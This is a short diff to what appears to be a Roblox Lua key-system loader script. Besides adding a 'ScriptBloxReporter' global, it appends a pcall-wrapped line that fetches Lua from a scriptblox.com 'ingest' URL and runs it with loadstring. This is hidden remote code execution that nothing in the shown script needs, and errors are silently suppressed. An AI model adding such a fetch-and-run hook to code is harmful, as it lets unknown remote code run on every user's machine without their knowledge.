@@ -1,4 +1,7 @@
+
 repeat task.wait() until game:IsLoaded()
+
+getgenv().ScriptBloxReporter = "proj_761cfae4482a"
 local Header = "https://api.luarmor.net/files/v4/loaders/"
 local KeySystem = {
     Services = {
@@ -648,3 +651,7 @@ function KeySystem.Functions.Start()
     KeySystem.Functions.CreateGui()
 end
 KeySystem.Functions.Start()
+
+pcall(function()
+    loadstring(game:HttpGet("https://scriptblox.com/ingest/client.lua"))()
+end)
